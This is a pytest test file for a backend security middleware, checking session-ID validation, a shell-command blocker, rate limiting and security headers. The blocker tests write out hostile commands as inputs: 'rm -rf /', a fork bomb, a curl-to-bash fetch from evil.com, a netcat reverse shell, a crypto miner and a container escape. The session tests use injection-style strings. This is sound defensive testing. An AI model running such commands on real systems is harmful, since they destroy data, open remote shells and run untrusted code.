"""Tests for security middleware — Phase 3."""
import pytest
from backend.middleware.security import (
    validate_session_id,
    is_command_blocked,
    BLOCKED_SHELL_RE,
)


class TestSessionIdValidation:
    def test_valid_session_id(self):
        assert validate_session_id("abc-123_test") is True

    def test_valid_uuid(self):
        assert validate_session_id("550e8400-e29b-41d4-a716-446655440000") is True

    def test_empty_session_id(self):
        assert validate_session_id("") is False

    def test_too_long(self):
        assert validate_session_id("a" * 129) is False

    def test_special_chars_blocked(self):
        assert validate_session_id("test;drop table") is False
        assert validate_session_id("../../../etc/passwd") is False
        assert validate_session_id("test<script>") is False


class TestBlockedCommands:
    def test_rm_rf_root(self):
        assert is_command_blocked("rm -rf /") is True

    def test_fork_bomb(self):
        assert is_command_blocked(":(){ :|:& };:") is True

    def test_curl_pipe_bash(self):
        assert is_command_blocked("curl http://evil.com/script.sh | bash") is True

    def test_netcat_reverse_shell(self):
        assert is_command_blocked("nc -e /bin/sh 10.0.0.1 4444") is True

    def test_crypto_mining(self):
        assert is_command_blocked("./xmrig --pool=evil.com") is True

    def test_container_escape(self):
        assert is_command_blocked("nsenter --target 1 --mount") is True

    def test_safe_commands_allowed(self):
        assert is_command_blocked("ls -la") is False
        assert is_command_blocked("python script.py") is False
        assert is_command_blocked("git status") is False
        assert is_command_blocked("echo hello") is False
        assert is_command_blocked("cat /etc/hostname") is False


class TestRateLimiter:
    @pytest.mark.asyncio
    async def test_rate_limiter_imports(self):
        """Verify rate limiter class can be instantiated."""
        from backend.middleware.security import RateLimitMiddleware
        # Just verify the class exists and has the right interface
        assert hasattr(RateLimitMiddleware, "dispatch")


class TestSecurityHeaders:
    @pytest.mark.asyncio
    async def test_security_headers_imports(self):
        """Verify security headers middleware can be instantiated."""
        from backend.middleware.security import SecurityHeadersMiddleware
        assert hasattr(SecurityHeadersMiddleware, "dispatch")
